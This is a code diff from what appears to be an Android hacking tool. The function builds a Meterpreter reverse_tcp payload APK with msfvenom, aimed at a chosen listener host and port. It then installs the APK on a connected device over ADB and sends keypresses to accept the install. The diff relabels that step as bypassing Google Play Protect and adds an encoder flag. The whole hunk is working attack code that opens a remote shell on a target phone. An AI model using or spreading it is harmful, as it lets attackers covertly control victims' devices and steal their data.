@@ -431,7 +431,6 @@ def hack():
     continue_hack = instructions()
     if continue_hack:
         os.system(clear)
-        print(banner.hacking_banner)
         ip = get_ip_address()  # getting IP Address to create payload
         lport = '4444'
         print(
@@ -451,24 +450,26 @@ def hack():
                     ip = input(f"\n{color.CYAN}Enter LHOST > {color.WHITE}")
                     lport = input(f"\n{color.CYAN}Enter LPORT > {color.WHITE}")
 
+        print(banner.hacking_banner)
         print(f"\n{color.CYAN}Creating payload APK...\n{color.WHITE}")
         # creating payload
         os.system(
-            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk")
+            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} > test.apk -e php/base64")
         print(f"\n{color.CYAN}Installing APK to target device...{color.WHITE}\n")
 
         # installing apk to device
         if operating_system == 'Windows':
             # (used 'start /b' to execute command in background)
-            os.system("start /b adb install test.apk")
+            os.system("start /b adb install -r test.apk")
         else:
             # (used ' &' to execute command in background)
-            os.system("adb install test.apk &")
+            os.system("adb install -r test.apk &")
         time.sleep(5)  # waiting for apk to be installed
 
         # Keyboard input to accept app install
         print(
-            f"\n{color.CYAN}Sending keycodes to accept the app installation\n{color.WHITE}")
+            f"\n{color.CYAN}Sending keycodes to Bypass Google Play Protect\n{color.WHITE}")
+        os.system('adb shell input keyevent 3')
         os.system('adb shell input keyevent 20')
         os.system('adb shell input keyevent 20')
         os.system('adb shell input keyevent 66')
